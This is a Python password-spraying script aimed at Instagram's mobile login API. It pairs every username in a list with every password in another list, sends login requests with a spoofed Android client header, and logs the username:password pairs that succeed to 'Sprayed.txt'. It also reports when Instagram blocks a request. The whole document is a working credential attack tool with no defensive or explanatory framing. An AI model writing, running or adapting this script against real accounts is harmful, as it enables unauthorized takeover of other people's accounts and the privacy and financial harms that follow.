import requests

file1 = open('users.txt', 'r')
file2 = open('passwords.txt', 'r')
Users = file1.read().splitlines()
Passwords = file2.read().splitlines()
url = "https://i.instagram.com/api/v1/accounts/login/"
headers = {
        "User-Agent": "Instagram 252.0.0.23.14 Android (25/7.1.2; 320dpi; 900x1600; samsung; SM-N976N; dream2qltechn; qcom; fr_FR; 399993167)",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "i.instagram.com",
        "Content-Length": "145"
        }
for password in Passwords:
    for user in Users:
        print (user+":"+password)
        data = {"signed_body": "SIGNATURE.{\"device_id\":\"Instagram 252.0.0.23.14 Android\",\"enc_password\":\"#PWD_INSTAGRAM:0:0:"+password+"\",\"username\":\""+user+"\"}"}
        response = requests.Request('POST', url, headers=headers, data=data)
        prepared_req = response.prepare()
        s = requests.Session()
        send = s.send(prepared_req)
        #print(response.data)
        #print(send.status_code)
        #print(send.content)
        if send.status_code==200:
            print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ BOOM GOOD PASSWORD ! $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
            f = open("Sprayed.txt", "a")
            f.write("\n")
            f.write("--------------------------------------------------------------------------------------------------------------\n")
            f.write(user+":"+password)
            f.close()
        elif send.status_code==400:
            print("============================================ BLOCKED by instagram ! =============================================")
        else:
            print("-------------------------------------------- ERROR wrong password ! ---------------------------------------------")
file1.close()
file2.close()